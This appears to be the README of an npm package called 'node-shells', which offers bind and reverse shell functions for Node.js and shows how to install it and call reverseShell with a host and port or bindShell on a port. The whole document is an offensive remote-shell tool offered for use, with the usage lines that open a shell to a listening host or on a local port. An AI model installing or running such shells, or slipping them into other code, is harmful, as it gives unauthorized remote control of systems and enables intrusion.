# node-shells

Currently a very simple bind and reverse shell that can be used with node.js. Tested on node 0.10.15

## Install
```
npm install node-shells
```

## Usage: Reverse Shell
```
var shells = require('node-shells');

shells.reverseShell('127.0.0.1', '1234'); // host, port
```


## Usage: Bind Shell
```
var shells = require('node-shells');
shells.bindShell('1234'); // port
```
